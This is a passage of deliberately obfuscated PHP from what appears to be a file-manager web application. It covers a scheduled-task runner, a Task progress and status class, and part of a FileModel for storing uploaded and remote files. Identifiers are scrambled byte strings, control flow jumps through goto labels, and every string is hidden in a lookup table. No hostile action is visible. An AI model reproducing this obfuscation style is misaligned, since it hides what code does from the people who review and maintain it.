self::valueSet($bÕ¿æ‡¤ßœ[686], $bÕ¿æ‡¤ßœ[464]); sleep(self::valueGet($bÕ¿æ‡¤ßœ[1384]) + 5); self::valueSet($bÕ¿æ‡¤ßœ[1379], $bÕ¿æ‡¤ßœ[464]); self::valueSet($bÕ¿æ‡¤ßœ[686], $bÕ¿æ‡¤ßœ[83]); } public static function shutdownEvent() { $DŠËå¾§¿ˆ =& $_SERVER[Ö¹ñÒÁ²÷]; self::valueSet($DŠËå¾§¿ˆ[1379], $DŠËå¾§¿ˆ[464]); self::log($DŠËå¾§¿ˆ[1385]); } public static function config($aƒŸõƒØ‹, $D¸Ë¥š«Òâ) { $dÃï‰Ê¤·œ =& $_SERVER[Ö¹ñÒÁ²÷]; $B±ÏÒøÏÜ = 20; $D¸Ë¥š«Òâ = intval($D¸Ë¥š«Òâ) <= $B±ÏÒøÏÜ ? $B±ÏÒøÏÜ : intval($D¸Ë¥š«Òâ); self::valueSet($dÃï‰Ê¤·œ[686], $aƒŸõƒØ‹); self::valueSet($dÃï‰Ê¤·œ[1384], $D¸Ë¥š«Òâ); } private static function taskRunAll() { $BãòÜ«Š  =& $_SERVER[Ö¹ñÒÁ²÷]; $C«õ¦ö˜¾† = Model($BãòÜ«Š [1386])->listData(); $aÇ¥‹¹ˆ´ = count($C«õ¦ö˜¾†); for ($f„‰¯ö°ñ¶ = 0; $f„‰¯ö°ñ¶ < $aÇ¥‹¹ˆ´; $f„‰¯ö°ñ¶++) { $dƒ‰´¹‘ƒá = $C«õ¦ö˜¾†[$f„‰¯ö°ñ¶]; if ($dƒ‰´¹‘ƒá[$BãòÜ«Š [1387]] != $BãòÜ«Š [83]) { continue; } if (!self::taskTimeCheck($dƒ‰´¹‘ƒá)) { continue; } self::taskRun($dƒ‰´¹‘ƒá); } Hook::trigger($BãòÜ«Š [1388]); } private static function taskTimeCheck($EßÃÕó÷Ğ³) { goto B¬…²ÛóŠ‚; B¬…²ÛóŠ‚: $bšÇ›‚áãÓ =& $_SERVER[Ö¹ñÒÁ²÷]; $f´šë÷ñ‹ = json_decode($EßÃÕó÷Ğ³[$bšÇ›‚áãÓ[186]], !0); $cøñ¬´‚Ûƒ = intval($EßÃÕó÷Ğ³[$bšÇ›‚áãÓ[1380]]); goto A‰ÙŸä˜¦¹; E±†ôãè¼Ö: switch ($f´šë÷ñ‹[$bšÇ›‚áãÓ[29]]) { case $bšÇ›‚áãÓ[1395]: if (time() - $cøñ¬´‚Ûƒ < 3600 * 24 * 30) { return !1; } if ($f´šë÷ñ‹[$bšÇ›‚áãÓ[1395]] == date($bšÇ›‚áãÓ[1396]) && $eÄ²ÚÉ‘ª‰) { return !0; } break; case $bšÇ›‚áãÓ[1397]: if (time() - $cøñ¬´‚Ûƒ < 3600 * 24 * 7) { return !1; } $AŞ”Â¤›™Ñ = date($bšÇ›‚áãÓ[1398]) == 0 ? 7 : date($bšÇ›‚áãÓ[1398]); if ($f´šë÷ñ‹[$bšÇ›‚áãÓ[1397]] == $AŞ”Â¤›™Ñ && $eÄ²ÚÉ‘ª‰) { return !0; } break; case $bšÇ›‚áãÓ[1390]: if (time() - $cøñ¬´‚Ûƒ < 3600 * 24) { return !1; } if ($eÄ²ÚÉ‘ª‰) { return !0; } break; case $bšÇ›‚áãÓ[1399]: if (time() - $cøñ¬´‚Ûƒ >= floatval($f´šë÷ñ‹[$bšÇ›‚áãÓ[1399]]) * 60) { return !0; } break; default: break; } return !1; goto cõ…çËâ×ò; A‰ÙŸä˜¦¹: $cšä¥öÆ«‰ = strtotime($bšÇ›‚áãÓ[1389] . $f´šë÷ñ‹[$bšÇ›‚áãÓ[1390]] . $bšÇ›‚áãÓ[1391]) - strtotime($bšÇ›‚áãÓ[1392]); $aøÆÙ¬ø„­ = time() - strtotime(date($bšÇ›‚áãÓ[1393]) . $bšÇ›‚áãÓ[1394]); $eÄ²ÚÉ‘ª‰ = $aøÆÙ¬ø„­ >= $cšä¥öÆ«‰ && $aøÆÙ¬ø„­ <= $cšä¥öÆ«‰ + 3600; goto E±†ôãè¼Ö; cõ…çËâ×ò: } public static function taskRun($fÜÊœÑ¥©ˆ) { goto BÑöÆƒòÛ; BÑöÆƒòÛ: $eªï”¯Ìôï =& $_SERVER[Ö¹ñÒÁ²÷]; self::log($eªï”¯Ìôï[1400] . $fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[363]] . $eªï”¯Ìôï[1401] . $fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[28]] . $eªï”¯Ìôï[1402] . $fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[1403]]); Model($eªï”¯Ìôï[1386])->run($fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[363]]); goto aáÉÔ‡‹ï; aáÉÔ‡‹ï: $A‹ßœ³±›á = timeFloat(); $e’“áƒ†›Î = $eªï”¯Ìôï[33]; switch ($fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[29]]) { case $eªï”¯Ìôï[291]: $A‰İê×Ñ¬Ã = url_request($fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[1403]], $eªï”¯Ìôï[212], !1, !1, !1, !1, 5); $e’“áƒ†›Î = strlen($A‰İê×Ñ¬Ã); break; case $eªï”¯Ìôï[211]: $e’“áƒ†›Î = Hook::apply($fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[1403]]); default: break; } goto bÁç…²æÑÈ; bÁç…²æÑÈ: Model($eªï”¯Ìôï[1404])->add(array($eªï”¯Ìôï[1405] => $eªï”¯Ìôï[33], $eªï”¯Ìôï[1406] => $eªï”¯Ìôï[464], $eªï”¯Ìôï[29] => $eªï”¯Ìôï[1407] . $fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[363]], $eªï”¯Ìôï[1408] => json_encode(array($eªï”¯Ìôï[28] => $fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[28]], $eªï”¯Ìôï[1409] => timeFloat() - $A‹ßœ³±›á, $eªï”¯Ìôï[277] => $e’“áƒ†›Î)))); self::log($eªï”¯Ìôï[1410] . $fÜÊœÑ¥©ˆ[$eªï”¯Ìôï[363]] . $eªï”¯Ìôï[1411] . $e’“áƒ†›Î); return !0; goto EÏù¼±Ğ˜ª; EÏù¼±Ğ˜ª: } private static function valueGet($dÁâÉàÃ’Ó) { $e·Ôš˜Î§Ä =& $_SERVER[Ö¹ñÒÁ²÷]; $AÑ¥á†å = $e·Ôš˜Î§Ä[1412]; $b…¸â’šô = Model($e·Ôš˜Î§Ä[1413])->get($dÁâÉàÃ’Ó, $AÑ¥á†å); if (is_null($b…¸â’šô)) { Model($e·Ôš˜Î§Ä[1413])->set($e·Ôš˜Î§Ä[1384], 10, $AÑ¥á†å); Model($e·Ôš˜Î§Ä[1413])->set($e·Ôš˜Î§Ä[686], $e·Ôš˜Î§Ä[83], $AÑ¥á†å); Model($e·Ôš˜Î§Ä[1413])->set($e·Ôš˜Î§Ä[1379], $e·Ôš˜Î§Ä[464], $AÑ¥á†å); $b…¸â’šô = Model($e·Ôš˜Î§Ä[1413])->get($dÁâÉàÃ’Ó, $AÑ¥á†å); } return $b…¸â’šô; } private static function valueSet($D´ïÊîµ°Ø, $eÂ³ôñ™á—) { $bĞùÏñ¡ôí =& $_SERVER[Ö¹ñÒÁ²÷]; return Model($bĞùÏñ¡ôí[1413])->set($D´ïÊîµ°Ø, $eÂ³ôñ™á—, $bĞùÏñ¡ôí[1412]); } protected static function log($e…ò”Ù„ó ) { write_log($e…ò”Ù„ó , $_SERVER[Ö¹ñÒÁ²÷][1414]); } private static function cacheClear() { $f—ë¨‰ì‰ğ =& $_SERVER[Ö¹ñÒÁ²÷]; $CÜÒóîÕ¨¡ = Model($f—ë¨‰ì‰ğ[1413])->cacheKey($f—ë¨‰ì‰ğ[1412]); Cache::clearMemory($CÜÒóîÕ¨¡); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\156\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($føÌ•‡öŸ, $f¨Á¢‰ô…É = '', $Fç‰Ê³ô  = 0, $eá½ĞÄ‰À¡ = '') { goto FÉæÔ¼„Ä; cÍÊŞÕ–: Hook::bind($f°¾À†ì¯¥[1381], array($this, $f°¾À†ì¯¥[1423])); Hook::bind($f°¾À†ì¯¥[1424], array($this, $f°¾À†ì¯¥[1425])); $this->startAfter(); goto aĞ“àÚæé; aĞ“àÚæé: Hook::trigger($f°¾À†ì¯¥[1426], $this->task); $this->task[$f°¾À†ì¯¥[1420]] = timeFloat(); self::valueSet($this->task[$f°¾À†ì¯¥[363]], $this->task); goto CêƒïĞà¬Á; FÉæÔ¼„Ä: $f°¾À†ì¯¥ =& $_SERVER[Ö¹ñÒÁ²÷]; if (self::get($føÌ•‡öŸ)) { return; } $this->task = array($f°¾À†ì¯¥[363] => $føÌ•‡öŸ, $f°¾À†ì¯¥[1415] => USER_ID, $f°¾À†ì¯¥[1323] => $eá½ĞÄ‰À¡, $f°¾À†ì¯¥[29] => $f¨Á¢‰ô…É, $f°¾À†ì¯¥[974] => $f°¾À†ì¯¥[33], $f°¾À†ì¯¥[972] => $Fç‰Ê³ô , $f°¾À†ì¯¥[984] => 0, $f°¾À†ì¯¥[1416] => 0, $f°¾À†ì¯¥[1417] => 0, $f°¾À†ì¯¥[1418] => timeFloat(), $f°¾À†ì¯¥[1419] => 0, $f°¾À†ì¯¥[1420] => 0, $f°¾À†ì¯¥[1421] => 0, $f°¾À†ì¯¥[1422] => 0, $f°¾À†ì¯¥[686] => $f°¾À†ì¯¥[1379]); goto cÍÊŞÕ–; CêƒïĞà¬Á: } public function end() { goto CÂ‡œÁ‰‹; CÂ‡œÁ‰‹: $Dè‰áß‡Óá =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->task) { return; } if ($this->task[$Dè‰áß‡Óá[1420]]) { self::valueSet($this->task[$Dè‰áß‡Óá[363]], !1); } goto C¶òèšé¿‹; A¼ÛÓÈ÷ ¯: Hook::unbind($Dè‰áß‡Óá[1424], array($this, $Dè‰áß‡Óá[1425])); $this->endAfter(); $this->task = !1; goto eÔÆ‰Ú†â×; C¶òèšé¿‹: $Dæ¬èŠé æ = timeFloat() - $this->task[$Dè‰áß‡Óá[1418]]; self::log($Dè‰áß‡Óá[1427] . $this->task[$Dè‰áß‡Óá[363]] . $Dè‰áß‡Óá[1428] . $Dæ¬èŠé æ . $Dè‰áß‡Óá[1429]); Hook::unbind($Dè‰áß‡Óá[1381], array($this, $Dè‰áß‡Óá[1423])); goto A¼ÛÓÈ÷ ¯; eÔÆ‰Ú†â×: } public function update($fİÇ¡›¤À† = 0) { goto C¨Ó£ìÍ¤; C†¯Âœ’‡Ò: $FªèæÙÁÅ[$Cñò˜ŒÃËó[984]] += $fİÇ¡›¤À†; $FªèæÙÁÅ[$Cñò˜ŒÃËó[1419]] = timeFloat(); if ($FªèæÙÁÅ[$Cñò˜ŒÃËó[972]]) { if ($FªèæÙÁÅ[$Cñò˜ŒÃËó[972]] < $FªèæÙÁÅ[$Cñò˜ŒÃËó[984]]) { $FªèæÙÁÅ[$Cñò˜ŒÃËó[972]] = $FªèæÙÁÅ[$Cñò˜ŒÃËó[984]]; } $Dùî×àğãÜ = timeFloat() - $FªèæÙÁÅ[$Cñò˜ŒÃËó[1418]] - $FªèæÙÁÅ[$Cñò˜ŒÃËó[1421]]; $FªèæÙÁÅ[$Cñò˜ŒÃËó[1416]] = $FªèæÙÁÅ[$Cñò˜ŒÃËó[984]] / $FªèæÙÁÅ[$Cñò˜ŒÃËó[972]]; $FªèæÙÁÅ[$Cñò˜ŒÃËó[1417]] = $FªèæÙÁÅ[$Cñò˜ŒÃËó[984]] / $Dùî×àğãÜ; if ($FªèæÙÁÅ[$Cñò˜ŒÃËó[1416]] > 0) { $FªèæÙÁÅ[$Cñò˜ŒÃËó[1422]] = $Dùî×àğãÜ * (1 - $FªèæÙÁÅ[$Cñò˜ŒÃËó[1416]]) / $FªèæÙÁÅ[$Cñò˜ŒÃËó[1416]]; } $FªèæÙÁÅ[$Cñò˜ŒÃËó[1422]] = $FªèæÙÁÅ[$Cñò˜ŒÃËó[1422]] <= 0 ? 0 : $FªèæÙÁÅ[$Cñò˜ŒÃËó[1422]]; } goto bò†æ¬¼Ø; aªïääÜ: $E¬ŞÕ˜²ô“ = self::get($FªèæÙÁÅ[$Cñò˜ŒÃËó[363]]); $E²¶è£»ìÂ = $E¬ŞÕ˜²ô“[$Cñò˜ŒÃËó[686]]; if ($E²¶è£»ìÂ == self::STATYS_KILL) { $e©¿áŠ«° = array($Cñò˜ŒÃËó[1430] => LNG($Cñò˜ŒÃËó[1431]), $Cñò˜ŒÃËó[1026] => !1); Cache::set($Cñò˜ŒÃËó[1432] . $this->task[$Cñò˜ŒÃËó[363]], $e©¿áŠ«°, 30); $this->end(); die; } else { if ($E²¶è£»ìÂ == self::STATYS_STOP) { $bç÷Å¤„¢ = 2; $E¬ŞÕ˜²ô“[$Cñò˜ŒÃËó[1421]] += $bç÷Å¤„¢; self::valueSet($FªèæÙÁÅ[$Cñò˜ŒÃËó[363]], $E¬ŞÕ˜²ô“); sleep($bç÷Å¤„¢); $this->update(); return; } } goto EÍ½Á­ç›; bò†æ¬¼Ø: $this->updateAfter(); $B×œÕÜÁ§ = 0.2; if (timeFloat() - $FªèæÙÁÅ[$Cñò˜ŒÃËó[1420]] < $B×œÕÜÁ§) { return; } goto aªïääÜ; C¨Ó£ìÍ¤: $Cñò˜ŒÃËó =& $_SERVER[Ö¹ñÒÁ²÷]; $FªèæÙÁÅ =& $this->task; if (!$FªèæÙÁÅ) { return; } goto C†¯Âœ’‡Ò; EÍ½Á­ç›: $FªèæÙÁÅ[$Cñò˜ŒÃËó[686]] = $E²¶è£»ìÂ ? $E²¶è£»ìÂ : $FªèæÙÁÅ[$Cñò˜ŒÃËó[686]]; $FªèæÙÁÅ[$Cñò˜ŒÃËó[1421]] = $E¬ŞÕ˜²ô“[$Cñò˜ŒÃËó[1421]] ? $E¬ŞÕ˜²ô“[$Cñò˜ŒÃËó[1421]] : 0; $FªèæÙÁÅ[$Cñò˜ŒÃËó[1420]] = timeFloat(); goto DÜøÀÑËèõ; DÜøÀÑËèõ: Hook::trigger($Cñò˜ŒÃËó[1433], $FªèæÙÁÅ); self::valueSet($FªèæÙÁÅ[$Cñò˜ŒÃËó[363]], $FªèæÙÁÅ); goto B”ÜøóÓˆ; B”ÜøóÓˆ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($F¤İôä÷Ø) { $bÍ‚æ´”Êµ =& $_SERVER[Ö¹ñÒÁ²÷]; Cache::set($bÍ‚æ´”Êµ[1432] . $this->task[$bÍ‚æ´”Êµ[363]], $F¤İôä÷Ø, 60); return $F¤İôä÷Ø; } public static function get($DÇ¥ù÷¾ÎÎ) { return self::valueGet($DÇ¥ù÷¾ÎÎ); } public static function listData() { $F™ÍÈÆŞÌŞ = self::valueGet(); return array_sort_by($F™ÍÈÆŞÌŞ, $_SERVER[Ö¹ñÒÁ²÷][1418], !0); } public static function kill($B‚©Ó©—â¥) { return self::changeStatus($B‚©Ó©—â¥, self::STATYS_KILL); } public static function stop($Fô“ñØ­Ì) { return self::changeStatus($Fô“ñØ­Ì, self::STATYS_STOP); } public static function restart($d‹„ŒœŠí) { return self::changeStatus($d‹„ŒœŠí, self::STATYS_RUNNING); } public static function killAll() { $f°Ğ¿¦ÔÛ» =& $_SERVER[Ö¹ñÒÁ²÷]; $bê™ËœÌ¾ß = self::listData(); foreach ($bê™ËœÌ¾ß as $eŒõÎœ¹ô¬) { self::kill($eŒõÎœ¹ô¬[$f°Ğ¿¦ÔÛ»[363]]); } sleep(2); foreach ($bê™ËœÌ¾ß as $eŒõÎœ¹ô¬) { self::valueSet($eŒõÎœ¹ô¬[$f°Ğ¿¦ÔÛ»[363]], !1); } } private static function changeStatus($dá¯£ƒ¸„, $EŞÏİ‹·ë×) { goto BËÂµ¿Ÿß; D„«í›¾ˆ: return !0; goto A¿âªÛ¹Âõ; DÙÈ©ï©¸»: $CÁ—ªÛ‰ã“[$DÄåŞèÑ‚Ü[686]] = $EŞÏİ‹·ë×; self::valueSet($dá¯£ƒ¸„, $CÁ—ªÛ‰ã“); self::log($DÄåŞèÑ‚Ü[1434] . $CÁ—ªÛ‰ã“[$DÄåŞèÑ‚Ü[363]] . $DÄåŞèÑ‚Ü[1435] . $EŞÏİ‹·ë×); goto D„«í›¾ˆ; BËÂµ¿Ÿß: $DÄåŞèÑ‚Ü =& $_SERVER[Ö¹ñÒÁ²÷]; $CÁ—ªÛ‰ã“ = self::valueGet($dá¯£ƒ¸„); if (!$CÁ—ªÛ‰ã“) { return !1; } goto DÙÈ©ï©¸»; A¿âªÛ¹Âõ: } public static function valueGet($c‘¢Ê×™ = false) { $D‰âªèôå‹ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($c‘¢Ê×™) { $fçéİŠ¾Ğ = Model($D‰âªèôå‹[395])->where(array($D‰âªèôå‹[89] => $c‘¢Ê×™, $D‰âªèôå‹[29] => $D‰âªèôå‹[1436]))->find(); return $fçéİŠ¾Ğ ? json_decode($fçéİŠ¾Ğ[$D‰âªèôå‹[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($dà°‚àÎÚ = false) { goto DùñÔ¼›õ­; C×ö«ŠÌ•¢: return $e›¡÷çõß; goto dù†³ŒÁ©À; D®ã‘âô°: $e›¡÷çõß = Model($D÷Í±¹‡Áê[395])->where($e‰Ââ¸ŠÅÂ)->select(); $e›¡÷çõß = $e›¡÷çõß ? $e›¡÷çõß : array(); foreach ($e›¡÷çõß as $c¦¶ÛßÍ‡ => $A¢Ïø„‰ç‡) { $e›¡÷çõß[$c¦¶ÛßÍ‡] = json_decode($A¢Ïø„‰ç‡[$D÷Í±¹‡Áê[355]], !0); } goto C×ö«ŠÌ•¢; DùñÔ¼›õ­: $D÷Í±¹‡Áê =& $_SERVER[Ö¹ñÒÁ²÷]; $e‰Ââ¸ŠÅÂ = array($D÷Í±¹‡Áê[29] => $D÷Í±¹‡Áê[1436]); if ($dà°‚àÎÚ) { $e‰Ââ¸ŠÅÂ[$D÷Í±¹‡Áê[1415]] = $dà°‚àÎÚ; } goto D®ã‘âô°; dù†³ŒÁ©À: } public static function valueSet($b³¼¯á¨ÑŒ, $eğßÙƒãŒÅ) { goto f˜ÑÒ÷‘Øõ; e†ŠîÑšƒÉ: if (!$B×Æ¤”Ê) { ob_start(); var_dump($eğßÙƒãŒÅ); $eå‘Ì›©¢² = ob_get_clean(); self::log($b—Æ†Û­İ£[1437] . json_encode_force($eå‘Ì›©¢²)); } if (!$b³¼¯á¨ÑŒ || !$eğßÙƒãŒÅ[$b—Æ†Û­İ£[363]]) { return !1; } $a¥øíê©ã„ = array($b—Æ†Û­İ£[29] => $b—Æ†Û­İ£[1436], $b—Æ†Û­İ£[1415] => USER_ID, $b—Æ†Û­İ£[89] => $b³¼¯á¨ÑŒ, $b—Æ†Û­İ£[355] => $B×Æ¤”Ê); goto D†‚¢–â‹œ; D†‚¢–â‹œ: Model($b—Æ†Û­İ£[395])->add($a¥øíê©ã„, array(), !0); goto E£†µ¨¬­; f˜ÑÒ÷‘Øõ: $b—Æ†Û­İ£ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$eğßÙƒãŒÅ) { return Model($b—Æ†Û­İ£[395])->where(array($b—Æ†Û­İ£[89] => $b³¼¯á¨ÑŒ, $b—Æ†Û­İ£[29] => $b—Æ†Û­İ£[1436]))->delete(); } $B×Æ¤”Ê = json_encode($eğßÙƒãŒÅ); goto e†ŠîÑšƒÉ; E£†µ¨¬­: } public static function log($bŒ¹¾ÜŸØÎ) { write_log($bŒ¹¾ÜŸØÎ, $_SERVER[Ö¹ñÒÁ²÷][1438]); } } goto Béğ¨„‰á¹; Bõ“©ƒá„Ì: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\155\145" => "\151\157\137\146\151\x6c\x65\137\155\x65\x74\x61", "\155\145\x74\141\106\x69\145\x6c\144" => "\x66\x69\x6c\145\111\104"); public function fileInfo($d÷×äÆø­) { $e¿¹ ëÄÜñ =& $_SERVER[Ö¹ñÒÁ²÷]; static $DšØã‘˜«Ş = array(); if (!isset($DšØã‘˜«Ş[$d÷×äÆø­])) { $B¶¸½¥‚©£ = $e¿¹ ëÄÜñ[2122]; $d¤‰‡³øïá = Model($e¿¹ ëÄÜñ[418])->field($B¶¸½¥‚©£)->where(array($e¿¹ ëÄÜñ[416] => $d÷×äÆø­))->find(); $DšØã‘˜«Ş[$d÷×äÆø­] = $d¤‰‡³øïá; } return $DšØã‘˜«Ş[$d÷×äÆø­]; } public function addFileByContent($fÔìÆê÷©í = '', $CØÑ¤ÛÎ‘ = '') { goto Cè”“õ¨; eÖÀ‡§Ãîº: if (file_exists($cøœ¸ÛÆˆ¯)) { @unlink($cøœ¸ÛÆˆ¯); } return $EíøëÓÇ˜; goto a¯‹„¤ÙİŠ; Cè”“õ¨: $FÛÖÊãË‹Î =& $_SERVER[Ö¹ñÒÁ²÷]; $C¹ö”Ÿ‘Â = TEMP_PATH . $FÛÖÊãË‹Î[2123]; if (!is_dir($C¹ö”Ÿ‘Â)) { mk_dir($C¹ö”Ÿ‘Â); } goto B˜’ƒ¨‡…å; B˜’ƒ¨‡…å: $cøœ¸ÛÆˆ¯ = $C¹ö”Ÿ‘Â . $FÛÖÊãË‹Î[2124] . rand_string(16); file_put_contents($cøœ¸ÛÆˆ¯, $fÔìÆê÷©í); $EíøëÓÇ˜ = $this->addFile($cøœ¸ÛÆˆ¯, $CØÑ¤ÛÎ‘, !0); goto eÖÀ‡§Ãîº; a¯‹„¤ÙİŠ: } public function createFileName($E¸¤ï’İà) { goto DÄ÷ãÜç¾¿; DÄ÷ãÜç¾¿: $FÈµ¹¥¸âÒ =& $_SERVER[Ö¹ñÒÁ²÷]; $AÊ§°–Õ•‹ = IO::init($FÈµ¹¥¸âÒ[8]); $EóŒ‚Œ­µÁ = $this->makeFilePath($E¸¤ï’İà, $AÊ§°–Õ•‹); goto Bïî“‡Ùé; Bïî“‡Ùé: $EîÖÌªŸ÷á = $AÊ§°–Õ•‹->pathFather($EóŒ‚Œ­µÁ); static $B¼¨†ç‰Í = false; $eØ¼Â™ÏÆË = $FÈµ¹¥¸âÒ[2125] . md5($EîÖÌªŸ÷á); goto B‹•ÆĞ®Œ; B‹•ÆĞ®Œ: if (!$B¼¨†ç‰Í && !Cache::get($eØ¼Â™ÏÆË)) { $B¼¨†ç‰Í = !0; $bğ‡ÒØï·µ = IO::mkdir($EîÖÌªŸ÷á); if (!IO::exist($bğ‡ÒØï·µ . $FÈµ¹¥¸âÒ[2126])) { IO::mkfile($bğ‡ÒØï·µ . $FÈµ¹¥¸âÒ[2126]); } Cache::set($eØ¼Â™ÏÆË, 1, 3600 * 2); } return $EóŒ‚Œ­µÁ; goto eƒöõÒè…; eƒöõÒè…: } public function makeFilePath($f°ÒÀ›®Ö, $C¼’Šƒœ‚) { goto E•‚¥™Æ‘‡; AçÖÓÅ—•: switch ($c¹§ÑíÛ¤ç) { case $C‘±º½çÛô[2130]: $A¥Ìæé³  = $A¥Ìæé³  . $C‘±º½çÛô[91] . $C¼’Šƒœ‚->ext($f°ÒÀ›®Ö); if ($C¼’Šƒœ‚->ext($f°ÒÀ›®Ö) == $C‘±º½çÛô[2069]) { $A¥Ìæé³  .= $C‘±º½çÛô[2131]; } break; case $C‘±º½çÛô[2132]: goto BŸÛ¸ÉÙóï; CÓÔøÑ™ö×: break; goto C‘ìâ¢Ğê; C¸ÅÓ…ïó—: if ($C¼’Šƒœ‚->ext($f°ÒÀ›®Ö) == $C‘±º½çÛô[2069]) { $f°ÒÀ›®Ö .= $C‘±º½çÛô[2131]; } $aÏÂÏÏ³˜Ö = IO::fileNameAuto($F¨±åøŞ, $f°ÒÀ›®Ö); $A¥Ìæé³  = $F¨±åøŞ . $aÏÂÏÏ³˜Ö; goto CÓÔøÑ™ö×; BŸÛ¸ÉÙóï: $Cèòƒİ©—Ò = Model($C‘±º½çÛô[1082])->get($C‘±º½çÛô[1316]); $aÓ·Ã‡ ç× = substr(md5($C‘±º½çÛô[1889] . $Cèòƒİ©—Ò . date($C‘±º½çÛô[684])), 0, 8); $F¨±åøŞ = KodIO::defaultIO() . date($C‘±º½çÛô[2133]) . $aÓ·Ã‡ ç× . $C‘±º½çÛô[8]; goto C¸ÅÓ…ïó—; C‘ìâ¢Ğê: case $C‘±º½çÛô[2129]: break; default: break; } return $A¥Ìæé³ ; goto BàÓ‹‚Û›; A‘·‰Äõä: $A¥Ìæé³  = $F¨±åøŞ . rand_string(5) . short_id(100); $f°ÒÀ›®Ö = str_replace($C‘±º½çÛô[8], $C‘±º½çÛô[70], KodIO::clear($f°ÒÀ›®Ö)); if (!$f°ÒÀ›®Ö) { $c¹§ÑíÛ¤ç = $C‘±º½çÛô[2129]; } goto AçÖÓÅ—•; E•‚¥™Æ‘‡: $C‘±º½çÛô =& $_SERVER[Ö¹ñÒÁ²÷]; $c¹§ÑíÛ¤ç = Model($C‘±º½çÛô[1082])->get($C‘±º½çÛô[2127]); $F¨±åøŞ = KodIO::defaultIO() . date($C‘±º½çÛô[2128]); goto A‘·‰Äõä; BàÓ‹‚Û›: } public function addFileByRemote($c–•Õ˜±ñ…, $CÁ±ğˆ‹ç, $bÉÕ­‰øÛ  = array()) { goto e¤ğµ±˜šÅ; DèˆÓÌ¥˜ö: $dŸÆİÕ¨¤ = IO::hashMd5($c–•Õ˜±ñ…, $e™ôØİğÓ¹); $cÚÎ÷›†¨ = KodIO::defaultDriver(); $AêÒÇöÂ¶´ = array($F¼ãØÂá‹[516] => IO::size($c–•Õ˜±ñ…), $F¼ãØÂá‹[2134] => 1, $F¼ãØÂá‹[382] => $CÁ±ğˆ‹ç, $F¼ãØÂá‹[732] => $cÚÎ÷›†¨[$F¼ãØÂá‹[363]], $F¼ãØÂá‹[383] => $c–•Õ˜±ñ…, $F¼ãØÂá‹[2135] => $bÉÕ­‰øÛ [$F¼ãØÂá‹[160]] ? $bÉÕ­‰øÛ [$F¼ãØÂá‹[160]] : IO::hashSimple($c–•Õ˜±ñ…), $F¼ãØÂá‹[2136] => $dŸÆİÕ¨¤ ? $dŸÆİÕ¨¤ : $e™ôØİğÓ¹); goto c«™Ã¥œøÕ; c«™Ã¥œøÕ: if ($CĞŞØ¢£Á = $this->addFileCheckExist($AêÒÇöÂ¶´[$F¼ãØÂá‹[160]], $AêÒÇöÂ¶´[$F¼ãØÂá‹[159]], $AêÒÇöÂ¶´[$F¼ãØÂá‹[77]])) { return $CĞŞØ¢£Á; } return $this->addFileData($AêÒÇöÂ¶´); goto A™°©§ÇË; e¤ğµ±˜šÅ: $F¼ãØÂá‹ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!IO::exist($c–•Õ˜±ñ…)) { return !1; } $e™ôØİğÓ¹ = $bÉÕ­‰øÛ [$F¼ãØÂá‹[159]] ? $bÉÕ­‰øÛ [$F¼ãØÂá‹[159]] : $F¼ãØÂá‹[33]; goto DèˆÓÌ¥˜ö; A™°©§ÇË: } private function addFileData($d©†Øî™‘¥) { $eÚ°ÆŞÎƒ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$d©†Øî™‘¥) { return !1; } $d©†Øî™‘¥[$eÚ°ÆŞÎƒ[77]] = intval($d©†Øî™‘¥[$eÚ°ÆŞÎƒ[77]]); if (!$d©†Øî™‘¥[$eÚ°ÆŞÎƒ[77]] && strlen($d©†Øî™‘¥[$eÚ°ÆŞÎƒ[160]]) > 32) { $d©†Øî™‘¥[$eÚ°ÆŞÎƒ[77]] = intval(substr($d©†Øî™‘¥[$eÚ°ÆŞÎƒ[160]], 32)); } $C·‰Ë£ù© = $this->add($d©†Øî™‘¥); return $this->find($C·‰Ë£ù©); } public function addFile($fÔ°›™³¥´, $Eõ»»Ÿ‚¨¬, $d«ò÷Ù•³é = false) { $c‰ƒÀœåÎ = IO::hashSimple($fÔ°›™³¥´); $bó„”§¥ì¨ = IO::hashMd5($fÔ°›™³¥´); $CÃï·ÎÑëƒ = IO::size($fÔ°›™³¥´); if ($aƒîÃÒ‘‰Ü = $this->addFileCheckExist($c‰ƒÀœåÎ, $bó„”§¥ì¨, $CÃï·ÎÑëƒ)) { return $aƒîÃÒ‘‰Ü; } $e£¾ŒÆÉ = $this->addFileMake($fÔ°›™³¥´, $CÃï·ÎÑëƒ, $c‰ƒÀœåÎ, $bó„”§¥ì¨, $Eõ»»Ÿ‚¨¬, $d«ò÷Ù•³é); return $this->addFileData($e£¾ŒÆÉ); } public function addFileMake($f¹ë¡ë«†Î, $Cß°Îçâœ, $dŸ»ª‹…—Œ, $E…÷’±ã¯Á, $cáîî„¿¹™, $eïİ²Şº) { goto cæÔÊíÎ¦; Dèáã„Ê: $AŸŞ¢º³äõ = get_path_this($bÉ’ŠÎåå); if ($eïİ²Şº) { $fƒëïšƒ„ = IO::move($f¹ë¡ë«†Î, $Eâö¹¯¤, !1, $AŸŞ¢º³äõ); } else { $fƒëïšƒ„ = IO::copy($f¹ë¡ë«†Î, $Eâö¹¯¤, !1, $AŸŞ¢º³äõ); } if (!$fƒëïšƒ„) { return !1; } goto B†´àµÒé; B†´àµÒé: $bñÁï¥Ñ¨Â = KodIO::defaultDriver(); $A´¹šÛÂë = array($F½ÙÈ²’ñÊ[516] => $Cß°Îçâœ, $F½ÙÈ²’ñÊ[2134] => 